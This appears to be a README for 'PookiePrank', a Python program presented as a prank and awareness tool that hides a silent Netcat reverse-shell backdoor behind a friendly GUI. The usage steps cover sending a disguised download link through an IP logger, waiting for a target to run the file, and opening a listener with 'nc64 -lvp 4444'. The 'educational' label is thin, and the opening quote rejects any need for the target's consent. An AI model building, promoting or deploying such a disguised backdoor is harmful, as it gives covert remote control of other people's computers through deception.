# PookiePrank: A Cute but Terrifying Cybersecurity Awareness Tool 🎀💀

> *“I seek not thy leave, nor bend my will to thine approval for the prank.  
> What must be done, I do — not by thy grace, but by mine own resolve.”*  
> — **Arnab, 2025**

---

## What Is This?

**PookiePrank** is a lightweight "educational" program designed to demonstrate the importance of digital awareness through *strategic chaos*.  
It's a prank tool wrapped in charm — **cute on the outside, spooky on the inside**.

- Uses `Netcat` for remote shell access (with full user control)
- Disguised behind a friendly-looking Python GUI
- Includes optional payloads like Rickrolling, shutdown timers, popups, etc.
- Perfect for ethical demos, cybersecurity training, and… *light mischief*.

---

## Features

- **Silent Netcat Backdoor:** Triggers a reverse shell silently via batch file.
- **User Distraction UI:** Friendly messages and fake interactions to lower suspicion.
- **Remote Payload Execution:** Once connected, send commands in real-time.
- **Prank Arsenal:** Shutdowns, message popups, browser hijacks, and more.
- **Educational Angle:** Reinforces the dangers of blind trust in random executables.

---

## Why?

Because **security through trauma** works.  
This tool is designed to:

- Raise awareness of how easily social engineering works.
- Show how reverse shells operate.
- Make friends laugh *and* cry.
- Be a conversation starter in any cybersecurity interview.

---

## Usage

1. Host the executable and `netcat` folder.
2. Send the masked download link using a shortened IP logger service.
3. Wait for the target to run the file.
4. Connect to the shell:
   ```bash
   nc64 -lvp 4444
